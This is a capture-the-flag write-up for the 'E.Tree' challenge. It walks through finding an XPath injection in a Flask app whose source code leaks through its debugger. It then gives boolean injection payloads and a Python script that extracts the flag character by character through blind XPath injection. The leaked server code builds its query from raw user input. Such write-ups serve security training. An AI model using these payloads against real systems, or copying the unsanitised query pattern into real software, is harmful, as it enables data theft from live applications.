# E.Tree - Cyber Apocalypse 2021
### Challenge Info
After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?
### Given Material
We have been provided with a military.xml file (included in this write-ups repo). After looking around the web app we can assume that the xml file represents the database schema used for looking up the platforms data.
### Identifying the flaw
After submitting and inspecting some dummy requests from the web app form we see that an http POST request is being made in the following form:

```JSON
{"POST":{"scheme":"http","host":"138.68.148.149:31767","filename":"/api/search","remote":{"Address":"138.68.148.149:31767"}}}
```

Using the following python script we can quickly modify and send multiple payloads and see how the api behaves.
```python
import requests as r
url = 'http://138.68.148.149:31767/api/search'
payload = {"search":"'"}
response = r.post(url,json=payload)
print(response.content)
```
It seems that when we submit a singe-quote character, an "lxml.etree.XPathEvalError" error is triggered on a wsgi debugger revealing some of the source code. The part of the source code we need to keep is the following:

```python
@app.route("/api/search", methods=["POST"])
def search():
    name = request.json.get("search", "")
    query = "/military/district/staff[name=\'{}\']".format(name)
    if tree.xpath(query):
        return {"success": 1, "message": "This millitary staff member exists."}
    return {"failure": 1, "message": "This millitary staff member doesn\'t exist."}

app.run("0.0.0.0", port=1337, debug=True)
```

We can now confirm that we have an XPath Injection. After inspecting the query variable it seems that we can inject almost custom input directly in the tree.xpath function. For example the single-quote we used earlier broke the formating resulting in the following query:
```python
"/military/district/staff[name=''']"
```

### Controlling the query
Now it's time to test some payloads. We can confirm we are modifying the queries with the following payloads:

-Using:
```python
payload = {"search":"dummy' or 1 = 2 or '"}
```
We get the following response:
```JSON
{"failure": 1,"message": "This millitary staff member doesn't exist."}
```
-Using:
```python
payload = {"search":"dummy' or 1 = 1 or '"}
```
We get the following response:
```JSON
{"message": "This millitary staff member exists.","success": 1}
```
Since we can only receive positive or negative responses we are going to handle this as a Blind Xpath Injection.

### Retrieving the flag
Upon inspecting the given xml database schema we see that the flag is split on two parts on the 'selfDestructCode' fields:
```html
<selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>
```
```html
<selfDestructCode>_f0r_t3st1ng}</selfDestructCode>
```
Using a payload in the form of:
```python
payload = {"search": f"dummy' or //selfDestructCode[starts-with(.,'{FLAG_PREFIX}')] or '"}
```
We can lookup any strings on any selfDestructCode fields on the whole document starting with FLAG_PREFIX. For a better reference on how the this Xpath query works we suggest the following resource: [Use the starts-with() XPath Function](https://docs.microsoft.com/en-us/previous-versions/troubleshoot/msxml/use-starts-with-xpath-function) 

Now it's just a matter of scripting. Launching the following script can give us the flag:
```python
import requests as r
import string

url = 'http://138.68.148.149:31767/api/search'

all_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$-%&_{\}'

def blindLxmlInjection(prefix):
    flag = prefix
    i = 0
    while i < len(all_chars):
        test = flag + all_chars[i]
        payload = {"search": f"dummy' or //selfDestructCode[starts-with(.,'{test}')] or '"}
        response = r.post(url,json=payload)
        i += 1
        if "success" in str(response.content):
            flag = test
            i = 0 
            print(flag)

blindLxmlInjection('CHTB{')
blindLxmlInjection('')

```

Soon we are greeted with the two parts of the flag, connect them and get:
```
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
```

Happy Hacking :)


